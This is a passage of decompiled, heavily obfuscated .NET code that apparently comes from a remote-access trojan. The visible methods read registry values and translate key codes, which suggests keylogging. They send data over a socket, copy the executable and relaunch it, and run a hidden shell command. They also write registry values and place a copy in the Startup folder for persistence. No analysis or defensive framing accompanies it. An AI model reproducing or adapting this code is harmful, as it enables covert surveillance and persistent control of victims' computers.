            if (!\u000F.\u0018(global::\u000E.\u0017(global::\u000E.\u0013((object) (num2.ToInt32() == obj0.\u0001), global::\u0008.\u0012((object) obj0.\u0001, \u0001.\u0001(obj1, (System.Type) null, \u0006.\u0007.\u001F(3487), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), false)), global::\u0008.\u0012(\u0001.\u0001(\u0001.\u0001(obj1, (System.Type) null, \u0006.\u0007.\u001F(3487), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, \u0006.\u0007.\u001F(3456), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (object) 0, false))))
            {
              obj0.\u0001 = num2.ToInt32();
              obj0.\u0001 = global::\u0002.\u0002(\u0001.\u0001(obj1, (System.Type) null, \u0006.\u0007.\u001F(3487), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
              str = global::\u0002.\u0002(global::\u000E.\u0015(global::\u000E.\u0015(global::\u000E.\u0015(global::\u000E.\u0015(global::\u000E.\u0015((object) \u001D.\u0099(\u001D.\u0099(\u0006.\u0007.\u001F(3508), \u0006.\u0007.\u0001(obj0)), \u0006.\u0007.\u001F(1021)), \u0001.\u0001(obj1, (System.Type) null, \u0006.\u0007.\u001F(3513), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)), (object) \u0006.\u0007.\u001F(1021)), (object) obj0.\u0001), (object) '\u0001'), (object) \u0006.\u0007.\u001F(781)));
              goto label_8;
            }
            else
              goto label_6;
label_4:
            obj1 = (object) process;
            goto label_1;
          }
          else
            goto label_8;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          exception1 = ex;
          global::\u0006.\u0006();
        }
label_6:
        if (true)
          return \u0006.\u0007.\u001F(379);
label_8:
        return str;
      }
      catch (Exception ex)
      {
        string str1;
        string str2 = str1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<IntPtr> local2 = (ValueType) num2;
        object obj2 = obj1;
        Exception exception2 = exception1;
        \u0001 obj3 = obj0;
        \u0006.\u0007.\u0001(ex, (object) str2, (object) local1, (object) local2, obj2, (object) exception2, (object) obj3);
        throw;
      }
    }

    static void \u0001([In] int obj0, [In] byte[] obj1, [In] int obj2, [In] \u0003.\u0004.\u000E obj3)
    {
      try
      {
        byte[] sourceArray = obj1;
        int sourceIndex = obj0;
        byte[] destinationArray = obj3.\u0001;
        int destinationIndex = obj3.\u0002;
        int length = obj2;
        if (true)
          goto label_2;
label_1:
        obj3.\u0002 += obj2;
        return;
label_2:
        Array.Copy((Array) sourceArray, sourceIndex, (Array) destinationArray, destinationIndex, length);
        goto label_1;
      }
      catch (Exception ex)
      {
        \u0003.\u0004.\u000E obj = obj3;
        byte[] numArray = obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) obj2;
        \u0006.\u0007.\u0001(ex, (object) obj, (object) numArray, (object) local1, (object) local2);
        throw;
      }
    }

    static int \u0001([In] \u0003.\u0004.\u0003 obj0)
    {
      int num1;
      try
      {
        do
        {
          int num2 = 32768;
          if (num2 != 0)
            num2 -= obj0.\u0002;
          num1 = num2;
        }
        while (false);
      }
      catch (Exception ex)
      {
        \u0003.\u0004.\u0003 obj = obj0;
        \u0006.\u0007.\u0001(ex, (object) obj);
        throw;
      }
      return num1;
    }

    static void \u0001([In] Exception obj0, [In] object obj1, [In] object obj2, [In] object obj3, [In] object obj4) => \u0006.\u0007.\u0001(obj0, new object[4]
    {
      obj1,
      obj2,
      obj3,
      obj4
    });

    static void \u0001([In] \u0002.\u0003 obj0, [In] \u0004.\u0004 obj1)
    {
      \u0008.\u0003 obj = obj0.\u0001;
      if (obj == null)
        return;
      obj((object) obj0, obj1);
    }

    static void \u0001([In] \u0003.\u0002 obj0)
    {
      try
      {
        if (obj0.\u0001 != null)
          return;
        obj0.\u0001 = new Thread(new ThreadStart(obj0.\u0001), 1);
        \u009B.\u007E\u0084\u0003((object) obj0.\u0001);
      }
      catch (Exception ex)
      {
        \u0003.\u0002 obj = obj0;
        \u0006.\u0007.\u0001(ex, (object) obj);
        throw;
      }
    }

    static string \u0001([In] \u0005.\u0002.\u0003 obj0) => obj0.\u0002;

    static unsafe string \u0001([In] uint obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(13);
      IntPtr num1;
      IntPtr num2;
      byte[] numArray1;
      StringBuilder stringBuilder;
      Exception exception;
      try
      {
        string str;
        try
        {
          stringBuilder = new StringBuilder();
          byte[] numArray2 = new byte[(int) byte.MaxValue];
          if (true)
            numArray1 = numArray2;
          *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) \u0006.\u0007.\u0001(numArray1);
          while (*(sbyte*) ((IntPtr) voidPtr + 12) != (sbyte) 0)
          {
            *(int*) ((IntPtr) voidPtr + 8) = (int) \u0006.\u0007.\u0001(obj0, 0U);
            if (true)
            {
              num1 = \u0006.\u0007.\u0001();
              *(int*) ((IntPtr) voidPtr + 4) = 0;
              // ISSUE: cast to a reference type
              *(int*) voidPtr = \u0006.\u0007.\u0001(num1, (int&) ((IntPtr) voidPtr + 4));
              num2 = \u0084\u0003.\u000E\u0006(\u0006.\u0007.\u0001(*(int*) voidPtr));
              \u0006.\u0007.\u0001(obj0, *(uint*) ((IntPtr) voidPtr + 8), numArray1, stringBuilder, 5, 0U, num2);
              str = \u001E.\u007E\u0002\u0002((object) stringBuilder);
              goto label_10;
            }
          }
          str = \u0006.\u0007.\u001F(379);
          goto label_10;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          exception = ex;
          global::\u0006.\u0006();
        }
        return ((Keys) checked ((int) obj0)).ToString();
label_10:
        return str;
      }
      catch (Exception ex)
      {
        string str;
        object[] objArray = new object[11]
        {
          (object) str,
          (object) *(int*) voidPtr,
          (object) numArray1,
          (object) (bool) *(sbyte*) ((IntPtr) voidPtr + 12),
          (object) num1,
          (object) num2,
          (object) *(int*) ((IntPtr) voidPtr + 4),
          (object) *(uint*) ((IntPtr) voidPtr + 8),
          (object) stringBuilder,
          (object) exception,
          (object) obj0
        };
        \u0006.\u0007.\u0001(ex, objArray);
        throw;
      }
    }

    static string \u0001([In] \u0003.\u0002 obj0, [In] string obj1)
    {
      string str1;
      string str2;
      RegistryKey registryKey1;
      Exception exception1;
      try
      {
        try
        {
          registryKey1 = \u0086\u0003.\u007E\u000F\u0006((object) Registry.LocalMachine, \u0006.\u0007.\u001F(3530), false);
          str1 = global::\u0002.\u0002(\u0093\u0002.\u007E\u0012\u0005((object) \u0092\u0002.\u007E\u0011\u0005((object) registryKey1, global::\u0002.\u0002(global::\u000E.\u0015(\u0086.\u007E\u0083\u0002((object) \u0086\u0003.\u007E\u000F\u0006((object) registryKey1, obj1, false), \u0006.\u0007.\u001F(379)), (object) \u0006.\u0007.\u001F(3555)))), \u0006.\u0007.\u001F(379), (object) \u0006.\u0007.\u001F(379)));
          if (!\u0015.\u007E\u001E((object) str1, \u0006.\u0007.\u001F(3240)))
            str1 = \u001D.\u0099(str1, \u0006.\u0007.\u001F(3576));
          str2 = str1;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          exception1 = ex;
          str2 = \u0006.\u0007.\u001F(379);
          global::\u0006.\u0006();
        }
        return str2;
      }
      catch (Exception ex)
      {
        string str3 = str2;
        string str4 = str1;
        RegistryKey registryKey2 = registryKey1;
        Exception exception2 = exception1;
        \u0003.\u0002 obj = obj0;
        string str5 = obj1;
        \u0006.\u0007.\u0001(ex, (object) str3, (object) str4, (object) registryKey2, (object) exception2, (object) obj, (object) str5);
        throw;
      }
    }

    static string \u0001([In] \u0001 obj0, [In] ref string obj1)
    {
      byte[] numArray1;
      string str1;
      string str2;
      try
      {
        numArray1 = \u0093.\u0014\u0003(obj1);
        str1 = \u007F\u0002.\u007E\u0095\u0004((object) \u0091.\u0010\u0003(), numArray1);
        do
        {
          str2 = str1;
        }
        while (false);
      }
      catch (Exception ex)
      {
        byte[] numArray2 = numArray1;
        string str3 = str1;
        \u0001 obj = obj0;
        string str4 = obj1;
        \u0006.\u0007.\u0001(ex, (object) numArray2, (object) str3, (object) obj, (object) str4);
        throw;
      }
      return str2;
    }

    static void \u0001([In] IWebProxy obj0, [In] \u0008.\u0008 obj1) => obj1.\u0001 = obj0;

    static void \u0001([In] \u0003.\u0004.\u0003 obj0, [In] int obj1)
    {
      int num1;
      try
      {
        \u0003.\u0004.\u0003 obj2 = obj0;
        int num2;
        num1 = num2 = obj2.\u0002;
        obj2.\u0002 = num2 + 1;
        if (num1 == 32768)
          throw new InvalidOperationException();
        byte[] numArray = obj0.\u0001;
        \u0003.\u0004.\u0003 obj3 = obj0;
        int num3;
        num1 = num3 = obj3.\u0001;
        obj3.\u0001 = num3 + 1;
        int index = num1;
        int num4 = (int) (byte) obj1;
        numArray[index] = (byte) num4;
        obj0.\u0001 &= (int) short.MaxValue;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) num1;
        \u0003.\u0004.\u0003 obj = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) obj1;
        \u0006.\u0007.\u0001(ex, (object) local1, (object) obj, (object) local2);
        throw;
      }
    }

    static Array \u0001([In] string obj0, [In] \u0001 obj1, [In] byte[] obj2)
    {
      string[] strArray;
      object obj3;
      object[] objArray1;
      object[] objArray2;
      bool[] flagArray1;
      object obj4;
      object obj5;
      object obj6;
      object[] objArray3;
      try
      {
        obj5 = (object) new List<byte[]>();
        obj3 = (object) new MemoryStream();
        obj4 = (object) new MemoryStream();
        strArray = \u0018\u0002.\u008B\u0004(\u0006.\u0007.\u0001(obj1, ref obj2), obj0, -1, CompareMethod.Binary);
        \u0011 obj7 = \u0011.\u001A;
        object obj8 = obj3;
        string str1 = \u0006.\u0007.\u001F(564);
        objArray1 = new object[3]
        {
          (object) obj2,
          (object) 0,
          (object) \u0018.\u007E\u0084((object) strArray[0])
        };
        objArray2 = objArray1;
        object[] objArray4 = objArray2;
        flagArray1 = new bool[3]{ true, false, false };
        bool[] flagArray2 = flagArray1;
        object obj9 = obj7(obj8, (System.Type) null, str1, objArray4, (string[]) null, (System.Type[]) null, flagArray2, true);
        if (flagArray1[0])
        {
          // ISSUE: type reference
          obj2 = (byte[]) \u0014.\u001D(\u0012.\u001B(objArray2[0]), \u0013.\u001C(__typeref (byte[])));
        }
        \u0011 obj10 = \u0011.\u001A;
        object obj11 = obj4;
        string str2 = \u0006.\u0007.\u001F(564);
        objArray2 = new object[3]
        {
          (object) obj2,
          (object) checked (\u0018.\u007E\u0084((object) strArray[0]) + \u0018.\u007E\u0084((object) obj0)),
          (object) checked (obj2.Length - \u0018.\u007E\u0084((object) strArray[0]) + \u0018.\u007E\u0084((object) obj0))
        };
        objArray1 = objArray2;
        object[] objArray5 = objArray1;
        flagArray1 = new bool[3]{ true, false, false };
        bool[] flagArray3 = flagArray1;
        object obj12 = obj10(obj11, (System.Type) null, str2, objArray5, (string[]) null, (System.Type[]) null, flagArray3, true);
        if (flagArray1[0])
        {
          // ISSUE: type reference
          obj2 = (byte[]) \u0014.\u001D(\u0012.\u001B(objArray1[0]), \u0013.\u001C(__typeref (byte[])));
        }
        \u0011 obj13 = \u0011.\u001A;
        object obj14 = obj5;
        string str3 = \u0006.\u0007.\u001F(3581);
        objArray2 = new object[1];
        object[] objArray6 = objArray2;
        obj6 = obj3;
        object obj15 = \u0012.\u001B(\u0001.\u0001(obj6, (System.Type) null, \u0006.\u0007.\u001F(573), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
        objArray6[0] = obj15;
        objArray1 = objArray2;
        object[] objArray7 = objArray1;
        flagArray1 = new bool[1]{ true };
        bool[] flagArray4 = flagArray1;
        object obj16 = obj13(obj14, (System.Type) null, str3, objArray7, (string[]) null, (System.Type[]) null, flagArray4, true);
        if (flagArray1[0])
        {
          global::\u0003 obj17 = global::\u0003.\u0003;
          object obj18 = obj6;
          string str4 = \u0006.\u0007.\u001F(573);
          objArray3 = new object[1]
          {
            \u0012.\u001B(objArray1[0])
          };
          object[] objArray8 = objArray3;
          obj17(obj18, (System.Type) null, str4, objArray8, (string[]) null, (System.Type[]) null, true, false);
        }
        \u0011 obj19 = \u0011.\u001A;
        object obj20 = obj5;
        string str5 = \u0006.\u0007.\u001F(3581);
        objArray3 = new object[1];
        object[] objArray9 = objArray3;
        obj6 = obj4;
        object obj21 = \u0012.\u001B(\u0001.\u0001(obj6, (System.Type) null, \u0006.\u0007.\u001F(573), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
        objArray9[0] = obj21;
        objArray2 = objArray3;
        object[] objArray10 = objArray2;
        flagArray1 = new bool[1]{ true };
        bool[] flagArray5 = flagArray1;
        object obj22 = obj19(obj20, (System.Type) null, str5, objArray10, (string[]) null, (System.Type[]) null, flagArray5, true);
        if (flagArray1[0])
        {
          global::\u0003 obj23 = global::\u0003.\u0003;
          object obj24 = obj6;
          string str6 = \u0006.\u0007.\u001F(573);
          objArray1 = new object[1]
          {
            \u0012.\u001B(objArray2[0])
          };
          object[] objArray11 = objArray1;
          obj23(obj24, (System.Type) null, str6, objArray11, (string[]) null, (System.Type[]) null, true, false);
        }
        object obj25 = \u0011.\u001A(obj3, (System.Type) null, \u0006.\u0007.\u001F(586), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
        object obj26 = \u0011.\u001A(obj4, (System.Type) null, \u0006.\u0007.\u001F(586), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
        return (Array) \u0001.\u0001(obj5, (System.Type) null, \u0006.\u0007.\u001F(573), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null);
      }
      catch (Exception ex)
      {
        Array array;
        object[] objArray12 = new object[13]
        {
          obj5,
          (object) array,
          obj3,
          obj4,
          (object) strArray,
          (object) objArray1,
          (object) objArray2,
          (object) flagArray1,
          obj6,
          (object) objArray3,
          (object) obj1,
          (object) obj2,
          (object) obj0
        };
        \u0006.\u0007.\u0001(ex, objArray12);
        throw;
      }
    }

    static int \u0001([In] \u0003.\u0004.\u000E obj0)
    {
      int num;
      try
      {
        num = obj0.\u0003;
      }
      catch (Exception ex)
      {
        \u0003.\u0004.\u000E obj = obj0;
        \u0006.\u0007.\u0001(ex, (object) obj);
        throw;
      }
      return num;
    }

    [DllImport("kernel32.Dll", EntryPoint = "GetVersionEx")]
    static extern short \u0001([In] ref \u0007.\u0003.\u0002 obj0);

    static void \u0001(
      [In] Exception obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3,
      [In] object obj4,
      [In] object obj5,
      [In] object obj6)
    {
      \u0006.\u0007.\u0001(obj0, new object[6]
      {
        obj1,
        obj2,
        obj3,
        obj4,
        obj5,
        obj6
      });
    }

    static long \u0001([In] \u0003.\u0004.\u0006 obj0)
    {
      long num;
      try
      {
        num = obj0.\u0001;
      }
      catch (Exception ex)
      {
        \u0003.\u0004.\u0006 obj = obj0;
        \u0006.\u0007.\u0001(ex, (object) obj);
        throw;
      }
      return num;
    }

    [DllImport("gdi32.dll", EntryPoint = "SelectObject")]
    static extern IntPtr \u0001([In] IntPtr obj0, [In] IntPtr obj1);

    static void \u0001([In] \u0001 obj0, [In] byte[] obj1)
    {
      object[] objArray1;
      object[] objArray2;
      bool[] flagArray1;
      object obj2;
      object obj3;
      object obj4;
      object[] objArray3;
      object[] objArray4;
      Exception exception;
      try
      {
        if (!obj0.\u0003)
          return;
        try
        {
          MemoryStream memoryStream = new MemoryStream();
          if (true)
            goto label_9;
label_2:
          \u0011 obj5 = \u0011.\u001A;
          object obj6 = obj2;
          string str1 = \u0006.\u0007.\u001F(564);
          object[] objArray5 = new object[3];
          if (true)
            objArray1 = objArray5;
          objArray1[0] = (object) obj1;
          objArray1[1] = (object) 0;
          objArray1[2] = (object) obj1.Length;
          objArray2 = objArray1;
          object[] objArray6 = objArray2;
          flagArray1 = new bool[3]{ true, false, false };
          bool[] flagArray2 = flagArray1;
          object obj7 = obj5(obj6, (System.Type) null, str1, objArray6, (string[]) null, (System.Type[]) null, flagArray2, true);
          if (flagArray1[0])
          {
            // ISSUE: type reference
            obj1 = (byte[]) \u0014.\u001D(\u0012.\u001B(objArray2[0]), \u0013.\u001C(__typeref (byte[])));
          }
          \u0011 obj8 = \u0011.\u001A;
          object obj9 = obj2;
          string str2 = \u0006.\u0007.\u001F(564);
          objArray2 = new object[3]
          {
            (object) \u0006.\u0007.\u0001(ref obj0.\u000F, obj0),
            (object) 0,
            (object) \u0018.\u007E\u0084((object) obj0.\u000F)
          };
          object[] objArray7 = objArray2;
          object obj10 = obj8(obj9, (System.Type) null, str2, objArray7, (string[]) null, (System.Type[]) null, (bool[]) null, true);
          \u0011 obj11 = \u0011.\u001A;
          object obj12 = \u0001.\u0001(obj0.\u0003, (System.Type) null, \u0006.\u0007.\u001F(507), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null);
          string str3 = \u0006.\u0007.\u001F(3586);
          objArray2 = new object[4];
          object[] objArray8 = objArray2;
          obj3 = obj2;
          object obj13 = \u0012.\u001B(\u0001.\u0001(obj3, (System.Type) null, \u0006.\u0007.\u001F(573), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
          objArray8[0] = obj13;
          objArray2[1] = (object) 0;
          object[] objArray9 = objArray2;
          obj4 = obj2;
          object obj14 = \u0012.\u001B(\u0001.\u0001(obj4, (System.Type) null, \u0006.\u0007.\u001F(3456), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
          objArray9[2] = obj14;
          objArray2[3] = (object) SocketFlags.None;
          objArray1 = objArray2;
          object[] objArray10 = objArray1;
          flagArray1 = new bool[4]
          {
            true,
            false,
            true,
            false
          };
          bool[] flagArray3 = flagArray1;
          object obj15 = obj11(obj12, (System.Type) null, str3, objArray10, (string[]) null, (System.Type[]) null, flagArray3, true);
          if (flagArray1[0])
          {
            global::\u0003 obj16 = global::\u0003.\u0003;
            object obj17 = obj3;
            string str4 = \u0006.\u0007.\u001F(573);
            objArray3 = new object[1]
            {
              \u0012.\u001B(objArray1[0])
            };
            object[] objArray11 = objArray3;
            obj16(obj17, (System.Type) null, str4, objArray11, (string[]) null, (System.Type[]) null, true, false);
          }
          if (flagArray1[2])
          {
            global::\u0003 obj18 = global::\u0003.\u0003;
            object obj19 = obj4;
            string str5 = \u0006.\u0007.\u001F(3456);
            objArray4 = new object[1]
            {
              \u0012.\u001B(objArray1[2])
            };
            object[] objArray12 = objArray4;
            obj18(obj19, (System.Type) null, str5, objArray12, (string[]) null, (System.Type[]) null, true, false);
          }
          object obj20 = \u0011.\u001A(obj2, (System.Type) null, \u0006.\u0007.\u001F(586), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
          return;
label_9:
          obj2 = (object) memoryStream;
          goto label_2;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          exception = ex;
          obj0.\u0003 = false;
          global::\u0006.\u0006();
        }
      }
      catch (Exception ex)
      {
        object[] objArray13 = new object[11]
        {
          obj2,
          (object) exception,
          (object) objArray1,
          (object) objArray2,
          (object) flagArray1,
          obj3,
          obj4,
          (object) objArray3,
          (object) objArray4,
          (object) obj0,
          (object) obj1
        };
        \u0006.\u0007.\u0001(ex, objArray13);
        throw;
      }
    }

    static void \u0001([In] \u0001 obj0)
    {
      object[] objArray1;
      char[] chArray1;
      Exception exception1;
      string str1;
      Exception exception2;
      Exception exception3;
      Exception exception4;
      object[] objArray2;
      bool[] flagArray1;
      object[] objArray3;
      object[] objArray4;
      bool[] flagArray2;
      Exception exception5;
      Exception exception6;
      Exception exception7;
      try
      {
        FileInfo fileInfo = (FileInfo) obj0.\u0001;
        global::\u0004 obj1 = global::\u0004.\u0004;
        string str2 = \u001E.\u007E\u009C((object) \u007F.\u001C\u0002(obj0.\u0005));
        chArray1 = new char[1]{ '\\' };
        string str3 = new string(chArray1);
        string str4 = \u001E.\u007E\u009C((object) obj0.\u0004);
        if (!\u0006.\u0007.\u0001(new FileInfo(obj1(str2, str3, str4)), fileInfo, obj0))
        {
          try
          {
            if (\u001C.\u0098(\u0006.\u0007.\u0001(obj0, \u0006.\u0007.\u001F(731)), \u0006.\u0007.\u001F(379), false) == 0)
            {
              \u000F obj2 = \u000F.\u0018;
              \u0001 obj3 = \u0001.\u0001;
              object obj4 = \u0001.\u0001(\u0001.\u0001(obj0.\u0001, (System.Type) null, \u0006.\u0007.\u001F(3595), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, \u0006.\u0007.\u001F(825), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null);
              string str5 = \u0006.\u0007.\u001F(3608);
              objArray1 = new object[1];
              object[] objArray5 = objArray1;
              chArray1 = new char[1]{ ':' };
              char[] chArray2 = chArray1;
              objArray5[0] = (object) chArray2;
              object[] objArray6 = objArray1;
              object obj5 = obj3(obj4, (System.Type) null, str5, objArray6, (string[]) null, (System.Type[]) null, (bool[]) null);
              if (obj2(obj5))
                \u0006.\u0007.\u0001(obj0, \u0006.\u0007.\u001F(3621), \u0006.\u0007.\u001F(736));
              else
                \u0006.\u0007.\u0001(obj0, \u0006.\u0007.\u001F(3621), \u0006.\u0007.\u001F(3626));
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            exception1 = ex;
            global::\u0006.\u0006();
          }
          try
          {
            \u0087\u0003 obj6 = \u0087\u0003.\u0010\u0006;
            \u0001 obj7 = obj0;
            str1 = \u0006.\u0007.\u001F(3631);
            ref string local = ref str1;
            string str6 = \u0006.\u0007.\u0001(obj7, ref local);
            string str7 = \u0006.\u0007.\u001F(2368);
            obj6(str6, str7, EnvironmentVariableTarget.User);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            exception2 = ex;
            global::\u0006.\u0006();
          }
          try
          {
            if (\u008A.\u009B\u0002(global::\u0004.\u0004(\u007F.\u001C\u0002(obj0.\u0005), \u0006.\u0007.\u001F(834), obj0.\u0004)))
              \u008D\u0002.\u0007\u0005(global::\u0004.\u0004(\u007F.\u001C\u0002(obj0.\u0005), \u0006.\u0007.\u001F(834), obj0.\u0004));
            \u008C obj8 = \u008C.\u0003\u0003;
            string str8 = global::\u0002.\u0002(\u0001.\u0001(obj0.\u0001, (System.Type) null, \u0006.\u0007.\u001F(2504), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
            global::\u0004 obj9 = global::\u0004.\u0004;
            string str9 = \u007F.\u001C\u0002(obj0.\u0005);
            chArray1 = new char[1]{ '\\' };
            string str10 = new string(chArray1);
            string str11 = obj0.\u0004;
            string str12 = obj9(str9, str10, str11);
            obj8(str8, str12, true);
            \u0008\u0003 obj10 = \u0008\u0003.\u008D\u0005;
            global::\u0004 obj11 = global::\u0004.\u0004;
            string str13 = \u007F.\u001C\u0002(obj0.\u0005);
            chArray1 = new char[1]{ '\\' };
            string str14 = new string(chArray1);
            string str15 = obj0.\u0004;
            string str16 = obj11(str13, str14, str15);
            Process process = obj10(str16);
            global::\u0006.\u0007();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            exception3 = ex;
            global::\u0006.\u0007();
            global::\u0006.\u0006();
          }
        }
        try
        {
          int num = \u0005\u0003.\u0089\u0005(global::\u0002.\u0002(global::\u000E.\u0015(global::\u000E.\u0015(global::\u000E.\u0015(global::\u000E.\u0015(global::\u000E.\u0015(global::\u000E.\u0015(global::\u000E.\u0015((object) \u0006.\u0007.\u001F(3672), \u0001.\u0001(obj0.\u0001, (System.Type) null, \u0006.\u0007.\u001F(2504), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)), (object) '"'), (object) \u0006.\u0007.\u001F(1021)), (object) '"'), \u0001.\u0001(obj0.\u0001, (System.Type) null, \u0006.\u0007.\u001F(825), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)), (object) '"'), (object) \u0006.\u0007.\u001F(3721))), AppWinStyle.Hide, false, -1);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          exception4 = ex;
          global::\u0006.\u0006();
        }
        try
        {
          \u0001 obj12 = \u0001.\u0001;
          object obj13 = \u0001.\u0001(\u0001.\u0001(obj0.\u0004, (System.Type) null, \u0006.\u0007.\u001F(795), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, \u0006.\u0007.\u001F(856), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null);
          string str17 = \u0006.\u0007.\u001F(839);
          objArray1 = new object[2]
          {
            (object) obj0.\u0010,
            (object) true
          };
          objArray2 = objArray1;
          object[] objArray7 = objArray2;
          flagArray1 = new bool[2]{ true, false };
          bool[] flagArray3 = flagArray1;
          object Instance = obj12(obj13, (System.Type) null, str17, objArray7, (string[]) null, (System.Type[]) null, flagArray3);
          if (flagArray1[0])
          {
            // ISSUE: type reference
            obj0.\u0010 = (string) \u0014.\u001D(\u0012.\u001B(objArray2[0]), \u0013.\u001C(__typeref (string)));
          }
          string MemberName = \u0006.\u0007.\u001F(2460);
          objArray3 = new object[2]
          {
            (object) obj0.\u0006,
            null
          };
          object[] objArray8 = objArray3;
          global::\u000E obj14 = global::\u000E.\u0015;
          object obj15 = global::\u000E.\u0015(global::\u000E.\u0015((object) '"', \u0001.\u0001(obj0.\u0001, (System.Type) null, \u0006.\u0007.\u001F(2504), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)), (object) '"');
          chArray1 = new char[3]{ ' ', '.', '.' };
          char[] chArray3 = chArray1;
          object obj16 = obj14(obj15, (object) chArray3);
          objArray8[1] = obj16;
          objArray4 = objArray3;
          object[] Arguments = objArray4;
          flagArray2 = new bool[2]{ true, false };
          bool[] CopyBack = flagArray2;
          NewLateBinding.LateCall(Instance, (System.Type) null, MemberName, Arguments, (string[]) null, (System.Type[]) null, CopyBack, true);
          if (flagArray2[0])
          {
            // ISSUE: type reference
            obj0.\u0006 = (string) \u0014.\u001D(\u0012.\u001B(objArray4[0]), \u0013.\u001C(__typeref (string)));
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          exception5 = ex;
          global::\u0006.\u0006();
        }
        try
        {
          \u0001 obj17 = \u0001.\u0001;
          object obj18 = \u0001.\u0001(\u0001.\u0001(obj0.\u0004, (System.Type) null, \u0006.\u0007.\u001F(795), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, \u0006.\u0007.\u001F(873), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null);
          string str18 = \u0006.\u0007.\u001F(839);
          objArray4 = new object[2]
          {
            (object) obj0.\u0010,
            (object) true
          };
          objArray3 = objArray4;
          object[] objArray9 = objArray3;
          flagArray2 = new bool[2]{ true, false };
          bool[] flagArray4 = flagArray2;
          object Instance = obj17(obj18, (System.Type) null, str18, objArray9, (string[]) null, (System.Type[]) null, flagArray4);
          if (flagArray2[0])
          {
            // ISSUE: type reference
            obj0.\u0010 = (string) \u0014.\u001D(\u0012.\u001B(objArray3[0]), \u0013.\u001C(__typeref (string)));
          }
          string MemberName = \u0006.\u0007.\u001F(2460);
          objArray2 = new object[2]
          {
            (object) obj0.\u0006,
            null
          };
          object[] objArray10 = objArray2;
          global::\u000E obj19 = global::\u000E.\u0015;
          object obj20 = global::\u000E.\u0015(global::\u000E.\u0015((object) '"', \u0001.\u0001(obj0.\u0001, (System.Type) null, \u0006.\u0007.\u001F(2504), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)), (object) '"');
          chArray1 = new char[3]{ ' ', '.', '.' };
          char[] chArray4 = chArray1;
          object obj21 = obj19(obj20, (object) chArray4);
          objArray10[1] = obj21;
          objArray1 = objArray2;
          object[] Arguments = objArray1;
          flagArray1 = new bool[2]{ true, false };
          bool[] CopyBack = flagArray1;
          NewLateBinding.LateCall(Instance, (System.Type) null, MemberName, Arguments, (string[]) null, (System.Type[]) null, CopyBack, true);
          if (flagArray1[0])
          {
            // ISSUE: type reference
            obj0.\u0006 = (string) \u0014.\u001D(\u0012.\u001B(objArray1[0]), \u0013.\u001C(__typeref (string)));
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          exception6 = ex;
          global::\u0006.\u0006();
        }
        try
        {
          \u008C.\u0003\u0003(global::\u0002.\u0002(\u0001.\u0001(obj0.\u0001, (System.Type) null, \u0006.\u0007.\u001F(2504), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)), \u009F\u0002.\u0083\u0005(\u0019\u0002.\u008C\u0004(Environment.SpecialFolder.Startup), \u0006.\u0007.\u001F(834), obj0.\u0006, \u0006.\u0007.\u001F(2517)), true);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          exception7 = ex;
          global::\u0006.\u0006();
        }
        \u001A.\u0095(1000);
      }
      catch (Exception ex)
      {
        object[] objArray11 = new object[16]
        {
          (object) exception1,
          (object) exception2,
          (object) exception3,
          (object) exception4,
          (object) exception5,
          (object) exception6,
          (object) exception7,
          (object) chArray1,
          (object) objArray1,
          (object) str1,
          (object) objArray2,
          (object) flagArray1,
          (object) objArray3,
          (object) objArray4,
          (object) flagArray2,
          (object) obj0
        };
        \u0006.\u0007.\u0001(ex, objArray11);
        throw;
      }
    }

    static bool \u0001([In] \u0003.\u0005 obj0) => obj0.\u0004;

    static bool \u0001([In] \u0003.\u0005 obj0) => obj0.\u0002;

    static void \u0001([In] \u0006.\u0004 obj0)
    {
      try
      {
        obj0.\u0001.GetMethod("Clear").Invoke(obj0.\u0001, new object[0]);
      }
      catch (Exception ex)
      {
        \u0006.\u0004 obj = obj0;
